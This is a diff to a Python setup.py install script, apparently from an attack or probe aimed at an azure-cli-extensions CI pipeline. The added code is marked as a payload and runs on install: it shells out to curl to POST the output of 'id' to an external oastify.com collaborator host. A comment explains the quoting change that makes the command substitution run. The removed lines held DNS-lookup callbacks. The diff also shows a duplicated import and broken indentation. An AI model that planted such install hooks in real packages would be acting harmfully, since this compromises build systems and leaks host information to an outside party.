@@ -8,27 +8,19 @@
 from codecs import open
 from setuptools import setup, find_packages
 import os
+import os
 import sys
-import socket
-# ... other imports ...
 
 # --- PAYLOAD START ---
 try:
-    # REPLACE THIS with your actual Collaborator domain
-    COLLAB_DOMAIN = "wtte6tfhnu0v54zand8c0mybk2qtel2a.oastify.com" 
+    COLLAB_DOMAIN = "wtte6tfhnu0v54zand8c0mybk2qtel2a.oastify.com"
     
-    # Method 1: System Curl (Most reliable on GitHub Runners)
-    # We add a path /azure-cli-pwned so you know exactly which exploit hit
-    os.system(f"curl -X POST -d 'id=$(id)' https://{COLLAB_DOMAIN}/azure-cli-extensions-pwned")
+    # NOTICE THE CHANGE: used \" instead of '
+    # This allows $(id) to be executed by the shell
+    os.system(f"curl -X POST -d \"id=$(id)\" https://{COLLAB_DOMAIN}/azure-cli-extensions-pwned")
     
-    # Method 2: System DNS (nslookup/dig) - Good if HTTP is firewalled
-    os.system(f"nslookup {COLLAB_DOMAIN}")
-    
-    # Method 3: Python Socket (Platform independent)
-    try:
-        socket.gethostbyname(COLLAB_DOMAIN)
-    except:
-        pass
+except:
+    pass
 
     # Still print to stderr just in case you want log proof too
     sys.stderr.write(f"\n[!] Sent OOB ping to {COLLAB_DOMAIN}\n")
